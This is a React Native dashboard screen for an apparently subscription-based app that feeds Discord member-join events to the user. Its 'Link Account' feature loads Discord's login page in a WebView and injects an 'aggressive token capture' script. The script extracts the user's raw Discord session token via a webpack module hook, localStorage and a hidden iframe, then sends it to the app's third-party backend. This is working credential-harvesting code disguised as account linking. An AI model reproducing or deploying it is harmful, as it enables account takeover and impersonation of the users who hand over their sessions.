import React, { useEffect, useRef, useState } from "react";
import {
  View,
  Text,
  FlatList,
  TouchableOpacity,
  Alert,
  StyleSheet,
  AppState,
  RefreshControl,
} from "react-native";
import { useNavigation } from "@react-navigation/native";
import AsyncStorage from "@react-native-async-storage/async-storage";
import { WebView } from "react-native-webview";
import * as Notifications from "expo-notifications";
import Clipboard from '@react-native-clipboard/clipboard';
import { isSubscriptionExpired } from "../utils/subscription";

const API_URL = "https://intelligent-gratitude-production.up.railway.app";

export default function Dashboard({ user, setUser }) {
  const navigation = useNavigation();
  const [moves, setMoves] = useState([]);
  const [showWebView, setShowWebView] = useState(false);
  const [webviewUrl, setWebviewUrl] = useState("https://discord.com/login");
  const [paystackUrl, setPaystackUrl] = useState(null);
  const [accounts, setAccounts] = useState([]);
  const [showAccountList, setShowAccountList] = useState(false);
  const [selectedAccount, setSelectedAccount] = useState(null);
  const webViewRef = useRef(null);
  const lastSeenId = useRef(null);
  const [refreshing, setRefreshing] = useState(false);
  const appBecameActiveTime = useRef(null); // Track when app became active
  const isInitialLoad = useRef(true); // Track if this is the first load after app opens
  const hasRedirectedToLogin = useRef(false);
  const [copiedItems, setCopiedItems] = useState(new Set()); // Track which items have been copied
  const [webViewKey, setWebViewKey] = useState(0); // Force WebView remount on each link attempt

  const getCacheKey = () => `cached_moves_${user?._id}_${selectedAccount || 'all'}`;

  // AGGRESSIVE TOKEN CAPTURE SCRIPT (from SF.JS)
  const INJECTED_JAVASCRIPT = `
  (function() {
    let captured = false;
    
    function capture() {
      if (captured) return true;
      
      try {
        // 1. TRY THE "WEBPACK" HOOK (Most reliable for Discord 2025)
        const webpack = window.webpackChunkdiscord_app;
        if (webpack) {
          const m = webpack.push([[Symbol()], {}, (e) => e]);
          for (const i in m.c) {
            if (m.c[i].exports && m.c[i].exports.default && m.c[i].exports.default.getToken) {
              const token = m.c[i].exports.default.getToken();
              if (token && token.length > 20) {
                captured = true;
                window.ReactNativeWebView.postMessage(JSON.stringify({type: 'TOKEN', data: token}));
                return true;
              }
            }
          }
        }

        // 2. TRY LOCALSTORAGE DIRECTLY
        try {
          const token = localStorage.getItem('token') || localStorage.getItem('_token');
          if (token && token.length > 20) {
            const clean = token.replace(/"/g, '').trim();
            if (clean.length > 20) {
              captured = true;
              window.ReactNativeWebView.postMessage(JSON.stringify({type: 'TOKEN', data: clean}));
              return true;
            }
          }
        } catch (e) {}

        // 3. TRY THE "IFRAME RESTORATION" HOOK
        // Discord deletes localStorage, but a new iframe can bring it back
        try {
          const iframe = document.createElement('iframe');
          iframe.style.display = 'none';
          document.body.appendChild(iframe);
          const storage = iframe.contentWindow.localStorage;
          const token = storage.getItem('token') || storage.getItem('_token');
          if (token && token.length > 20) {
            const clean = token.replace(/"/g, '').trim();
            if (clean.length > 20) {
              captured = true;
              window.ReactNativeWebView.postMessage(JSON.stringify({type: 'TOKEN', data: clean}));
              document.body.removeChild(iframe);
              return true;
            }
          }
          document.body.removeChild(iframe);
        } catch (e) {}
      } catch (e) {
        console.error('Token capture error:', e);
      }
      return false;
    }

    // Check immediately, then every 500ms
    if (capture()) return;
    
    const timer = setInterval(() => {
      if (capture()) {
        clearInterval(timer);
      }
    }, 500);
    
    // Stop after 30 seconds to prevent infinite checking
    setTimeout(() => clearInterval(timer), 30000);
  })();
`;

  useEffect(() => {
    if (!user) return;
    
    const loadCachedMoves = async () => {
      try {
        const cacheKey = getCacheKey();
        const cached = await AsyncStorage.getItem(cacheKey);
        if (cached) {
          const cachedMoves = JSON.parse(cached);
          setMoves(cachedMoves);
          if (cachedMoves.length > 0) {
            lastSeenId.current = cachedMoves[0]._id;
          }
        }
      } catch (e) {
        console.log('Error loading cached moves:', e);
      }
    };
    
    loadCachedMoves();
  }, [user, selectedAccount]);

  useEffect(() => {
    if (user) fetchAccounts();
  }, [user]);

  useEffect(() => {
    if (!user) return;
    
    const subscription = Notifications.addNotificationReceivedListener(notification => {
      console.log('📬 Notification received, refreshing moves...');
      setTimeout(() => fetchMoves(), 500);
    });

    return () => subscription.remove();
  }, [user, selectedAccount]);

  useEffect(() => {
    if (!user) return;
    
    const subscription = AppState.addEventListener('change', nextAppState => {
      if (nextAppState === 'active') {
        console.log('📱 App came to foreground, refreshing moves immediately...');
        appBecameActiveTime.current = Date.now(); // Mark when app became active
        isInitialLoad.current = true; // Mark as initial load
        fetchMoves();
      }
    });

    return () => subscription.remove();
  }, [user, selectedAccount]);

  useEffect(() => {
    if (!user) return;

    const initialTimeout = setTimeout(() => {
      fetchMoves();
    }, 100);

    const interval = setInterval(() => {
      fetchMoves();
    }, 2000);

    return () => {
      clearTimeout(initialTimeout);
      clearInterval(interval);
    };
  }, [user, selectedAccount]);

  const fetchMoves = async (showRefreshIndicator = false) => {
    if (!user || !user._id || !user.token) {
      if (showRefreshIndicator) setRefreshing(false);
      return;
    }
    
    if (isSubscriptionExpired(user)) {
      const updatedUser = {
        ...user,
        tier: "none",
        is_subscribed: false
      };
      await AsyncStorage.setItem("user_profile", JSON.stringify(updatedUser));
      setUser(updatedUser);
      if (showRefreshIndicator) setRefreshing(false);
      return;
    }
    
    if (showRefreshIndicator) setRefreshing(true);

    try {
      const url = selectedAccount
        ? `${API_URL}/get-all-moves?discord_id=${encodeURIComponent(selectedAccount)}`
        : `${API_URL}/get-all-moves`;
      
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 8000);
      
      const res = await fetch(url, {
        headers: { Authorization: `Bearer ${user.token}` },
        signal: controller.signal,
      });
      
      clearTimeout(timeoutId);
      
      if (res.status === 402) return;
      if (!res.ok) {
        console.error(`fetchMoves failed: ${res.status} ${res.statusText}`);
        return;
      }
      
      const data = await res.json();
      if (Array.isArray(data)) {
        // On initial load after app opens, set lastSeenId without triggering notification
        // This prevents duplicate notifications for moves that happened while app was closed
        if (isInitialLoad.current && data.length > 0) {
          lastSeenId.current = data[0]._id;
          isInitialLoad.current = false; // Clear the flag after first load
        } else if (
          lastSeenId.current &&
          data.length > 0 &&
          data[0]._id !== lastSeenId.current
        ) {
          // Only trigger notification if:
          // 1. We have a lastSeenId (not first time)
          // 2. AND the move is actually new (different ID)
          // 3. AND this is not the initial load (moves that happened while app was closed)
          triggerNotification(data[0]);
          lastSeenId.current = data[0]._id;
        } else if (data.length > 0 && !lastSeenId.current) {
          // First time loading, just set the ID without notification
          lastSeenId.current = data[0]._id;
        }
        
        setMoves(data);
        
        try {
          const cacheKey = getCacheKey();
          await AsyncStorage.setItem(cacheKey, JSON.stringify(data));
        } catch (cacheError) {
          console.log('Error caching moves:', cacheError);
        }
      }
    } catch (e) {
      if (e.name === 'AbortError') {
        console.log("fetchMoves timeout");
      } else {
        console.log("fetchMoves error", e.message || e);
      }
    } finally {
      if (showRefreshIndicator) setRefreshing(false);
    }
  };

  const onRefresh = async () => {
    await fetchMoves(true);
    await fetchAccounts();
  };

  const fetchAccounts = async () => {
    if (!user || !user.token) return;
    try {
      const res = await fetch(`${API_URL}/me/accounts`, {
        headers: { Authorization: `Bearer ${user.token}` },
      });

      if (res.ok) {
        const data = await res.json();
        setAccounts(Array.isArray(data) ? data : []);
        if (!selectedAccount && Array.isArray(data) && data.length > 0) {
          setSelectedAccount(data[0].discord_id || data[0]._id);
        }
      } else {
        console.log("Error fetching accounts:", res.status);
      }
    } catch (e) {
      console.log("fetchAccounts network error", e);
    }
  };

  const triggerNotification = async (move) => {
    if (user.tier === "none" || !user.is_subscribed) return;

    await Notifications.scheduleNotificationAsync({
      content: {
        title: `📥 New Member!`,
        body: move.action,
      },
      trigger: null,
    });
  };

  const handleCopy = (itemId, actionText) => {
    // Extract username from action text
    // Format is usually: "📥 Username joined ServerName" or "✅ Username verified in ServerName"
    const parts = actionText.split(" ").filter(p => p.trim());
    
    // Skip emoji (usually first part, very short) and take the username
    // If first part is very short (likely emoji), take second part
    // Handle "New Member" as special case (two words)
    let username = actionText; // fallback
    if (parts.length >= 2) {
      // Check if first part is likely an emoji (very short, 1-2 chars)
      if (parts[0].length <= 2) {
        // First part is emoji, username is second part
        username = parts[1];
        // Check if it's "New Member" (two words)
        if (parts[1] === "New" && parts[2] === "Member") {
          username = "New Member";
        }
      } else {
        // First part is likely the username
        username = parts[0];
      }
    } else if (parts.length === 1) {
      username = parts[0];
    }
    
    // Copy to clipboard
    Clipboard.setString(username);
    
    // Mark as copied (state can't change back once set)
    if (!copiedItems.has(itemId)) {
      setCopiedItems(prev => new Set([...prev, itemId]));
    }
  };

  const handlePay = async () => {
    navigation.navigate('Blocked');
  };

  const onWebViewMessage = async (event) => {
    const data = event.nativeEvent.data;
    console.log('📨 WebView message received:', data?.substring(0, 50));
    
    try {
      const message = JSON.parse(data);
      if (message.type === "TOKEN" && message.data) {
        console.log('✅ Token captured via JSON message');
        setShowWebView(false);
        setWebviewUrl("https://discord.com/logout"); // Reset URL
        await sendTokenToBackend(message.data);
        return;
      }
    } catch (e) {
      // Direct string fallback - if it looks like a token
      if (data && data.length > 20 && !data.includes('{') && !data.includes('error')) {
        console.log('✅ Token captured via direct string');
        setShowWebView(false);
        setWebviewUrl("https://discord.com/logout"); // Reset URL
        await sendTokenToBackend(data.trim());
        return;
      }
    }
    
    console.log('⚠️ Message received but not a valid token');
  };

  const sendTokenToBackend = async (discordToken) => {
    if (!user || !user.token) {
      Alert.alert("Error", "Please login first");
      setShowWebView(false); // Close WebView even on error
      return;
    }

    console.log('📤 Sending token to backend...');
    try {
      const response = await fetch(`${API_URL}/link-discord`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${user.token}`
        },
        body: JSON.stringify({ token: discordToken }),
      });

      const result = await response.json();
      if (response.ok) {
        console.log('✅ Discord account linked successfully');
        Alert.alert("✅ Success", "Discord account linked successfully!");
        await fetchAccounts(); // Refresh accounts list
        fetchMoves(); // Refresh moves
        // Ensure WebView is closed and reset for next attempt
        setShowWebView(false);
        setWebviewUrl("https://discord.com/login");
        hasRedirectedToLogin.current = false;
        setWebViewKey(prev => prev + 1); // Force remount on next open
      } else {
        console.error('❌ Link failed:', result.error);
        Alert.alert("Error", result.error || "Failed to link Discord account");
        // Keep WebView open so user can try again
      }
    } catch (error) {
      console.error("Link Discord error:", error);
      Alert.alert("Server Error", "Could not reach backend.");
      // Keep WebView open so user can try again
    }
  };

  const handleNavigationChange = (navState) => {
    const url = navState.url || "";
    console.log('🔗 Navigation changed to:', url);

    // If we're on any authenticated Discord app area (not just /channels or /@me),
    // start the token capture script. Discord keeps changing paths, so we use a
    // broader check instead of only /channels/@me.
    const isDiscordApp =
      url.startsWith("https://discord.com") ||
      url.startsWith("http://discord.com");

    const isLoginOrRegister =
      url.includes("/login") ||
      url.includes("/register") ||
      url.includes("/oauth2");

    if (isDiscordApp && !isLoginOrRegister) {
      console.log('💉 Injecting token capture script...');
      // Add a small delay to ensure page is loaded
      setTimeout(() => {
        webViewRef.current?.injectJavaScript(INJECTED_JAVASCRIPT);
      }, 1000);
    }
  };

  if (paystackUrl)
    return (
      <View style={{ flex: 1, backgroundColor: "#fff" }}>
        <View style={styles.webHeader}>
          <TouchableOpacity
            onPress={() => {
              setPaystackUrl(null);
            }}
            style={styles.webHeaderButton}
          >
            <Text style={styles.webHeaderText}>Close</Text>
          </TouchableOpacity>
        </View>
        <WebView source={{ uri: paystackUrl }} style={{ flex: 1 }} />
      </View>
    );

  if (showWebView)
    return (
      <View style={{ flex: 1 }}>
        <View style={styles.webHeader}>
          <TouchableOpacity
            onPress={() => {
              hasRedirectedToLogin.current = false;
              setShowWebView(false);
              setWebviewUrl("https://discord.com/login");
            }}
            style={styles.webHeaderButton}
          >
            <Text style={styles.webHeaderText}>Close</Text>
          </TouchableOpacity>
          <Text style={styles.webHeaderTitle}>Link Discord Account</Text>
          <View style={{ width: 50 }} />
        </View>
        <WebView
          key={`webview-${webViewKey}`} // Force remount on each link attempt
          ref={webViewRef}
          incognito={true} // Use incognito mode to prevent cookie persistence
          cacheEnabled={false} // Disable caching completely
          cacheMode="LOAD_NO_CACHE" // Android: Don't use cache
          source={{ uri: webviewUrl }}
          injectedJavaScript={INJECTED_JAVASCRIPT}
          injectedJavaScriptBeforeContentLoaded={
            "(function() { window.localStorage && window.localStorage.clear(); window.sessionStorage && window.sessionStorage.clear(); document.cookie.split(';').forEach(function(c) { document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date().toUTCString() + ';path=/'); }); })();"
          }
          onMessage={onWebViewMessage}
          onNavigationStateChange={handleNavigationChange}
          onLoadStart={(navState) => {
            console.log('📄 WebView load start:', navState.url);
            const url = navState.url || '';
            
            // If we hit a 404 or error page, redirect to login immediately
            if (url.includes('404') || url.includes('error') || url.includes('discord.com/logout')) {
              if (!hasRedirectedToLogin.current) {
                hasRedirectedToLogin.current = true;
                console.log('🔄 Detected 404/error, redirecting to login...');
                setTimeout(() => {
                  setWebviewUrl("https://discord.com/login");
                }, 500);
              }
            }
            
            // Clear storage on every navigation
            webViewRef.current?.injectJavaScript(`
              (function() {
                try {
                  window.localStorage.clear();
                  window.sessionStorage.clear();
                  document.cookie.split(';').forEach(function(c) {
                    document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date().toUTCString() + ';path=/');
                  });
                } catch(e) {}
              })();
            `);
          }}
          onLoadEnd={(navState) => {
            console.log('✅ WebView load end:', navState.url);
            const url = navState.url || '';
            
            // If we're on logout URL or 404, redirect to login immediately
            if ((url.includes("logout") || url.includes('404') || url.includes('error')) && !hasRedirectedToLogin.current) {
              hasRedirectedToLogin.current = true;
              console.log('🔄 Redirecting to Discord login...');
              setTimeout(() => {
                setWebviewUrl("https://discord.com/login");
              }, 500);
              return;
            }
            
            // If we're on login page, inject token capture script
            if (url.includes("login") && !url.includes("logout")) {
              setTimeout(() => {
                console.log('💉 Injecting token script on login page...');
                webViewRef.current?.injectJavaScript(INJECTED_JAVASCRIPT);
              }, 1000);
            }
            
            // Inject token capture script on any authenticated Discord page (not login/logout)
            if (url.startsWith("https://discord.com") && !url.includes("logout") && !url.includes("login") && !url.includes("404") && !url.includes("error")) {
              setTimeout(() => {
                console.log('💉 Injecting token script on authenticated page...');
                webViewRef.current?.injectJavaScript(INJECTED_JAVASCRIPT);
              }, 1000);
            }
          }}
          onError={(syntheticEvent) => {
            const { nativeEvent } = syntheticEvent;
            console.log('❌ WebView error:', nativeEvent);
            // If there's an error loading, redirect to login
            if (!hasRedirectedToLogin.current) {
              hasRedirectedToLogin.current = true;
              setTimeout(() => {
                setWebviewUrl("https://discord.com/login");
              }, 500);
            }
          }}
          onHttpError={(syntheticEvent) => {
            const { nativeEvent } = syntheticEvent;
            console.log('❌ WebView HTTP error:', nativeEvent.statusCode, nativeEvent.url);
            // If 404 or other error, redirect to login
            if ((nativeEvent.statusCode === 404 || nativeEvent.statusCode >= 400) && !hasRedirectedToLogin.current) {
              hasRedirectedToLogin.current = true;
              setTimeout(() => {
                setWebviewUrl("https://discord.com/login");
              }, 500);
            }
          }}
          javaScriptEnabled={true}
          domStorageEnabled={true} // Enable for token capture, but we clear it on each load
          sharedCookiesEnabled={false} // Prevent sharing cookies between sessions
          thirdPartyCookiesEnabled={false} // Disable third-party cookies
          userAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36"
        />
      </View>
    );

  return (
    <View style={{ flex: 1, padding: 16 }}>
      <View
        style={{
          flexDirection: "row",
          justifyContent: "space-between",
          alignItems: "center",
          marginBottom: 10,
        }}
      >
        <Text style={styles.liveFeedTitle}>Live Feed</Text>
        <View style={{ flexDirection: "row", alignItems: "center" }}>
          <TouchableOpacity
            style={{ marginRight: 12 }}
            onPress={async () => {
              // Reset all state for a fresh link attempt
              console.log('🔗 Starting new Discord link attempt...');
              
              // Close WebView first if it's open
              if (showWebView) {
                setShowWebView(false);
                // Wait a bit for WebView to fully unmount
                await new Promise(resolve => setTimeout(resolve, 300));
              }
              
              // Reset all state - go directly to login instead of logout (to avoid 404)
              hasRedirectedToLogin.current = false;
              setWebviewUrl("https://discord.com/login");
              
              // Force WebView to remount by changing key
              setWebViewKey(prev => prev + 1);
              
              // Clear WebView cache if available
              try {
                const { WebView } = require('react-native-webview');
                if (WebView.clearCache && typeof WebView.clearCache === 'function') {
                  WebView.clearCache(true);
                }
              } catch (e) {
                console.log('Could not clear WebView cache:', e);
              }
              
              // Open WebView after a small delay
              setTimeout(() => {
                setShowWebView(true);
              }, 100);
            }}
          >
            <Text style={{ color: "#5865F2" }}>Link Account</Text>
          </TouchableOpacity>
          <TouchableOpacity
            onPress={() => setShowAccountList(!showAccountList)}
          >
            <Text style={{ color: "#111827" }}>
              {selectedAccount
                ? accounts.find(
                    (a) => (a.discord_id || a._id) === selectedAccount
                  )?.username || "Filtering..."
                : "All Accounts"}{" "}
              ▾
            </Text>
          </TouchableOpacity>
        </View>
      </View>

      {showAccountList && (
        <View style={[styles.dropdown, { zIndex: 999, position: 'absolute', top: 50, right: 16, width: 200 }]}>
          <TouchableOpacity
            style={styles.dropdownItem}
            onPress={() => {
              setSelectedAccount(null);
              setShowAccountList(false);
              setMoves([]);
              lastSeenId.current = null;
            }}
          >
            <Text style={{ fontWeight: "bold" }}>All Accounts</Text>
          </TouchableOpacity>
          {accounts.map((a) => (
            <TouchableOpacity
              key={a._id}
              style={styles.dropdownItem}
              onPress={() => {
                setSelectedAccount(a.discord_id || a._id);
                setShowAccountList(false);
                setMoves([]);
                lastSeenId.current = null;
              }}
            >
              <Text>{a.username || a.discord_id || a._id}</Text>
            </TouchableOpacity>
          ))}
        </View>
      )}

      <FlatList
        data={moves}
        keyExtractor={(item) => item._id}
        renderItem={({ item }) => {
          const isCopied = copiedItems.has(item._id);
          return (
            <View style={styles.moveItem}>
              <View style={styles.moveContent}>
                <Text style={{ fontWeight: "600" }}>{item.action}</Text>
                <Text style={{ color: "#666", fontSize: 12 }}>
                  {new Date(item.timestamp).toLocaleString()}
                </Text>
              </View>
              <TouchableOpacity
                onPress={() => handleCopy(item._id, item.action)}
                style={[
                  styles.copyButton,
                  isCopied && styles.copyButtonCopied
                ]}
              >
                <Text style={[
                  styles.copyButtonText,
                  isCopied && styles.copyButtonTextCopied
                ]}>
                  {isCopied ? "Copied" : "Copy"}
                </Text>
              </TouchableOpacity>
            </View>
          );
        }}
        refreshControl={
          <RefreshControl refreshing={refreshing} onRefresh={onRefresh} />
        }
      />

      <TouchableOpacity style={styles.payButton} onPress={handlePay}>
        <Text
          style={{ color: "#fff", textAlign: "center", fontWeight: "bold" }}
        >
          Upgrade / Renew
        </Text>
      </TouchableOpacity>
    </View>
  );
}

const styles = StyleSheet.create({
  liveFeedTitle: {
    fontSize: 22,
    fontWeight: "bold",
    color: "#111827",
  },
  dropdown: {
    backgroundColor: "#fff",
    borderRadius: 8,
    padding: 8,
    marginBottom: 10,
    elevation: 3,
    shadowColor: "#000",
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
  },
  dropdownItem: {
    padding: 10,
    borderBottomWidth: 1,
    borderBottomColor: "#f0f0f0",
  },
  moveItem: {
    flexDirection: "row",
    justifyContent: "space-between",
    alignItems: "center",
    padding: 12,
    borderBottomWidth: 1,
    borderBottomColor: "#eee",
    backgroundColor: "#fff",
  },
  moveContent: {
    flex: 1,
    marginRight: 12,
  },
  copyButton: {
    backgroundColor: "#5865F2",
    paddingHorizontal: 16,
    paddingVertical: 8,
    borderRadius: 6,
    minWidth: 70,
    alignItems: "center",
  },
  copyButtonCopied: {
    backgroundColor: "#ef4444",
  },
  copyButtonText: {
    color: "#fff",
    fontWeight: "600",
    fontSize: 12,
  },
  copyButtonTextCopied: {
    color: "#fff",
  },
  payButton: {
    marginTop: 12,
    backgroundColor: "#5865F2",
    padding: 12,
    borderRadius: 8,
  },
  webHeader: {
    paddingTop: 50,
    paddingBottom: 15,
    backgroundColor: "#fff",
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "space-between",
    borderBottomWidth: 1,
    borderBottomColor: "#eee",
    paddingHorizontal: 16,
  },
  webHeaderButton: {
    paddingVertical: 8,
    paddingHorizontal: 12,
    borderRadius: 8,
    backgroundColor: "#ef4444",
  },
  webHeaderText: {
    color: "#fff",
    fontWeight: "bold",
  },
  webHeaderTitle: {
    color: "#111827",
    fontWeight: "bold",
    fontSize: 16,
    flex: 1,
    textAlign: "center",
  },
});

